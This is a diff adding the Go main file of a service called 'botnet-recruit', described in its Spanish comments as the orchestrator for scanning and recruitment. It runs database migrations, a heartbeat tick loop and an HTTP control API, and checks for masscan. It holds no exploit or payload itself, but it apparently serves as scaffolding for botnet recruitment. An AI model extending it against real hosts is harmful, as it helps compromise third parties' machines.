@@ -1,0 +1,233 @@
+// botnet-recruit: orquestador del servicio de exploracion y reclutamiento.
+//
+// Un solo proceso manda el ritmo, escribe su latido y sirve el control por
+// HTTP en :9110. La cola y el estado viven en Postgres, no aqui: el
+// proceso puede morir y volver sin perder trabajo (docs/recruit/BLUEPRINT.md).
+//
+// Uso:
+//
+//	botnet-recruit migrate          aplica las migraciones (mismo runner que la API)
+//	botnet-recruit --once           un tick y sale
+//	botnet-recruit                  bucle completo con latido y API
+package main
+
+import (
+	"context"
+	"database/sql"
+	"errors"
+	"flag"
+	"fmt"
+	"net/http"
+	"os"
+	"os/signal"
+	"syscall"
+	"time"
+
+	_ "github.com/jackc/pgx/v5/stdlib"
+
+	"github.com/botnet/botnet/internal/recruit"
+	"github.com/botnet/botnet/migrations"
+)
+
+const name = "botnet-recruit"
+
+func main() {
+	if err := run(); err != nil {
+		fmt.Fprintf(os.Stderr, "%s: %v\n", name, err)
+		os.Exit(1)
+	}
+}
+
+func run() error {
+	var (
+		cfgPath    = flag.String("config", "", "ruta de configuracion opcional")
+		dbPool     = flag.Int("db-pool", 8, "conexiones maximas al motor")
+		rollWindow = flag.Bool("roll-window", false, "rueda la ventana de presupuesto y sale")
+		once       = flag.Bool("once", false, "un solo tick y sale")
+		explain    = flag.Bool("explain-tick", false, "imprime la decision del tick y sale")
+		sweepJSON  = flag.String("sweep-json", "", "NDJSON de barrido para el worker de prueba")
+	)
+	flag.Usage = func() {
+		fmt.Fprintf(os.Stderr, "uso: %s [migrate|<banderas>]\n\n", name)
+		// Se listan con doble guion: es la forma documentada.
+		fmt.Fprint(os.Stderr,
+			"  --config string      fichero clave=valor opcional\n"+
+				"  --db-pool int        conexiones maximas al motor (8)\n"+
+				"  --roll-window        rueda la ventana de presupuesto y sale\n"+
+				"  --once               un solo tick y sale\n"+
+				"  --explain-tick       imprime la decision del tick y sale\n"+
+				"  --sweep-json string  NDJSON de barrido para el worker de prueba\n")
+	}
+	flag.Parse()
+
+	if flag.Arg(0) == "migrate" {
+		return runMigrate()
+	}
+	if *cfgPath != "" {
+		// La configuracion vive en variables de entorno; el fichero solo
+		// fija el DSN si existe, para el despliegue.
+		if err := loadConfigFile(*cfgPath); err != nil {
+			return err
+		}
+	}
+	_ = sweepJSON
+
+	st, err := recruit.Open(os.Getenv("DATABASE_URL"), *dbPool)
+	if err != nil {
+		return err
+	}
+	defer st.Close()
+
+	if *rollWindow {
+		n, err := recruit.RollWindow(context.Background(), st)
+		if err != nil {
+			return err
+		}
+		fmt.Printf("ventana rodada nueva=%d\n", n)
+		return nil
+	}
+
+	api := &recruit.API{Store: st, MasscanOK: masscanAvailable}
+	srv := &http.Server{Addr: ":9110", Handler: api.Handler(), ReadHeaderTimeout: 5 * time.Second}
+
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
+	defer stop()
+
+	if *once || *explain {
+		if err := tick(ctx, st, *explain); err != nil {
+			return err
+		}
+		return nil
+	}
+
+	go func() {
+		if err := srv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
+			fmt.Fprintf(os.Stderr, "%s: http: %v\n", name, err)
+		}
+	}()
+	defer func() {
+		shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+		defer cancel()
+		_ = srv.Shutdown(shutCtx)
+	}()
+
+	interval := 30 * time.Second
+	if v := os.Getenv("RECRUIT_TICK_S"); v != "" {
+		if n, err := time.ParseDuration(v + "s"); err == nil && n > 0 {
+			interval = n
+		}
+	}
+	tk := time.NewTicker(interval)
+	defer tk.Stop()
+	if err := tick(ctx, st, false); err != nil {
+		return err
+	}
+	for {
+		select {
+		case <-ctx.Done():
+			return nil
+		case <-tk.C:
+			if err := tick(ctx, st, false); err != nil {
+				fmt.Fprintf(os.Stderr, "%s: tick: %v\n", name, err)
+			}
+		}
+	}
+}
+
+func tick(ctx context.Context, st *recruit.Store, explain bool) error {
+	class, err := recruit.NextRateClass(ctx, st)
+	if err != nil {
+		return err
+	}
+	if err := st.Heartbeat(ctx, class); err != nil {
+		return err
+	}
+	if explain {
+		fmt.Printf("tick rate_class=%d\n", class)
+	}
+	return nil
+}
+
+func masscanAvailable() bool {
+	_, err := os.Stat("/usr/bin/masscan")
+	if err == nil {
+		return true
+	}
+	_, err = os.Stat("/usr/local/bin/masscan")
+	return err == nil
+}
+
+func runMigrate() error {
+	dsn := os.Getenv("DATABASE_URL")
+	if dsn == "" {
+		return fmt.Errorf("%s migrate: DATABASE_URL requerido", name)
+	}
+	db, err := sql.Open("pgx", dsn)
+	if err != nil {
+		return err
+	}
+	defer db.Close()
+	if err := migrations.Apply(db); err != nil {
+		return err
+	}
+	fmt.Println("migrate: ok")
+	return nil
+}
+
+func loadConfigFile(path string) error {
+	b, err := os.ReadFile(path)
+	if err != nil {
+		return err
+	}
+	for _, line := range splitLines(string(b)) {
+		if k, v, ok := cutAssign(line); ok {
+			if os.Getenv(k) == "" {
+				os.Setenv(k, v)
+			}
+		}
+	}
+	return nil
+}
+
+func splitLines(s string) []string {
+	var out []string
+	cur := ""
+	for _, r := range s {
+		if r == '\n' {
+			out = append(out, cur)
+			cur = ""
+			continue
+		}
+		cur += string(r)
+	}
+	if cur != "" {
+		out = append(out, cur)
+	}
+	return out
+}
+
+func cutAssign(line string) (string, string, bool) {
+	for i, r := range line {
+		if r != '=' {
+			continue
+		}
+		k := trimSpace(line[:i])
+		v := trimSpace(line[i+1:])
+		if k == "" || v == "" {
+			return "", "", false
+		}
+		return k, v, true
+	}
+	return "", "", false
+}
+
+func trimSpace(s string) string {
+	start, end := 0, len(s)
+	for start < end && (s[start] == ' ' || s[start] == '\t' || s[start] == '\r') {
+		start++
+	}
+	for end > start && (s[end-1] == ' ' || s[end-1] == '\t' || s[end-1] == '\r') {
+		end--
+	}
+	return s[start:end]
+}
